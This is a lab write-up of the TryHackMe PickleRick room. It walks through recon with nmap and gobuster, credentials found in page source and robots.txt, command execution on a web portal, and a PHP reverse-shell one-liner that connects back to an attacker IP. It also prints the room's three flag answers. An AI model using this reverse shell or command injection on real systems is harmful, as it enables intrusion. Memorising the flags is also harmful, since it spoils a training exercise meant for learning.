
# PickleRick - TryHackMe Challenge Write-up

## 🔍 Challenge Summary
**Description:** In this Rick and Morty-themed TryHackMe challenge, the goal is to exploit a vulnerable web server and retrieve three secret ingredients to help Rick turn himself back into a human.

> Note: The IP address used in this walkthrough is from my environment and will be different for you. The challenge specifies that we need to exploit a web server.

---

## 🔎 Step-by-Step Breakdown

### 🔹 Initial Recon: Nmap Scan

To start, I performed an Nmap scan:
```bash
nmap -A 10.10.194.203
```
The `-A` flag enables:
- OS Detection
- Version Detection
- Script Scanning
- Traceroute

![Nmap Scan](https://github.com/user-attachments/assets/b8aaa017-7941-4942-a9ce-08ba073f0009)

The scan revealed only two open ports:
- **Port 22 (SSH)**
- **Port 80 (HTTP)**

Opening `http://10.10.194.203` in the browser shows a landing page mentioning Morty:

![Landing Page](https://github.com/user-attachments/assets/eb1deaba-e235-4166-9e65-7a414813ac98)

I viewed the page source and found a comment that includes a possible username:

![Page Source](https://github.com/user-attachments/assets/ab0c9c33-b7bf-4728-8f8b-02a62c39b0b5)

**Discovered Username:** `R1ckRul3s`

---

### 🔍 Directory Bruteforce with Gobuster
To find hidden directories:
```bash
gobuster dir -u "http://10.10.194.203" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
```
- `dir` mode: directory brute-forcing
- `-u`: target URL
- `-w`: wordlist from SecLists

![Gobuster Result](https://github.com/user-attachments/assets/fb1538b6-6f6b-48fb-a5b3-dc6e76745e5f)

Among the results, `robots.txt` stood out. Visiting it:
```url
http://10.10.194.203/robots.txt
```

![robots.txt](https://github.com/user-attachments/assets/b490e33f-e322-4ed1-97ec-f9f57ecc0d4b)

**Discovered Password:** Appears to be inside robots.txt.

---

### 🔐 Logging In
I navigated to:
```url
http://10.10.194.203/login.php
```
Use these credentials (found in source and robots.txt):
- **Username:** `R1ckRul3s`
- **Password:** `Wubbalubbadubdub`

After login, you are redirected to `portal.php`:

![Portal Page](https://github.com/user-attachments/assets/7ac645cb-dcb9-4615-aa13-c28fdff8df41)

Tested command execution with `whoami`:

![Command Test](https://github.com/user-attachments/assets/c09a959b-6644-41f0-a0bd-9690b09296b2)

**Output:** `www-data`

Then, I listed the directory contents with:
```bash
ls
```
Discovered a file:
```url
http://10.10.194.203/Sup3rS3cretPickleIngred.txt
```

![First Ingredient](https://github.com/user-attachments/assets/1eafa6d8-8323-4c9f-be94-4d6c9cbe0225)

**First Ingredient:** `mr. meeseek hair`

---

## 🔌 Gaining Reverse Shell
Used a PHP reverse shell from [Invicti Reverse Shell Cheatsheet](https://www.invicti.com/learn/reverse-shell/).

On my attack box, I started a listener:
```bash
nc -lvnp 4443
```

Executed the following in the portal: I used php reverse shell as the website is itself hosted on php
```php
php -r '$sock=fsockopen("10.10.145.65",4443);exec("/bin/sh -i <&3 >&3 2>&3");'
```
> Replace `10.10.145.65` with your attack box IP.

![Reverse Shell Established](https://github.com/user-attachments/assets/5deb180a-604b-4b89-a133-7b26d2ea65ea)

Got a shell! Then upgraded it:
```bash
/bin/bash -i
```

Navigated to the home directory. Found two users: `ricky` and `ubuntu`. There is a space between second and  ingredients, so i had to use \ to rea the content
In `ricky`, found:
```bash
cat second\ ingredients
```

![Second Ingredient](https://github.com/user-attachments/assets/9e55cb47-3b8a-440d-a6a0-2a7f304b8a60)

**Second Ingredient:** `1 terry fold`

---

### 📂 Finding Final Flag
Switched to the `ubuntu` directory. Initially, nothing showed up:
```bash
ls -la
```
Found a hidden file `.bash_history`. Viewed it:
```bash
cat .bash_history
```

![Third Ingredient](https://github.com/user-attachments/assets/aa25438c-a368-47b3-9838-ce45a20da379)

**Third Ingredient:** `fleeb juice`

---

## 🧠 Summary
| Flag # | Ingredient           |
|--------|----------------------|
| 1      | mr. meeseek hair     |
| 2      | 1 terry fold         |
| 3      | fleeb juice          |

---

## 🧪 Lessons Learned
- Always check page source for hints.
- Use Gobuster to reveal hidden directories.
- Exploit command injection for reverse shell access.
- Look into user folders and command histories for sensitive info.

Thanks for reading my write-up! ⭐
